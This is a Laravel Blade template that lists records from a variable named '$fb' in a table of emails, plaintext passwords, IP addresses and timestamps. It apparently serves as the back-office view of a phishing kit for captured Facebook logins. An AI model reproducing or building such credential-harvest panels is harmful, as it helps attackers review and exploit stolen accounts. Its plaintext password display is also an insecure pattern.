<!DOCTYPE html>
<html lang="en">
    <head>
        @include('elements.header')
    </head>
    <body>
    @include('elements.nav')
        <div class="col-xs-12 container">
            <div class="auto-scroll-bar col-xs-12">
            <table class="table table-responsive table-hover col-xs-12">
                <thead>
                <tr>
                    <th>#</th>
                    <th>Email</th>
                    <th>Pwd</th>
                    <th>Ip</th>
                    <th>Created at</th>
                </tr>
                </thead>
                <tbody>
                @if(!empty($fb))
                    @foreach($fb as $k=>$v)
                    <tr>
                        <th scope="row">{{ $k+1 }}</th>
                        <td>{{ $v['email'] }}</td>
                        <td>{{ $v['pwd'] }}</td>
                        <td>{{ $v['ip'] }}</td>
                        <td>{{ $v['created_at'] }}</td>
                    </tr>
                    @endforeach
                @endif
                </tbody>
            </table>
            </div>
        </div>
    </body>
</html>
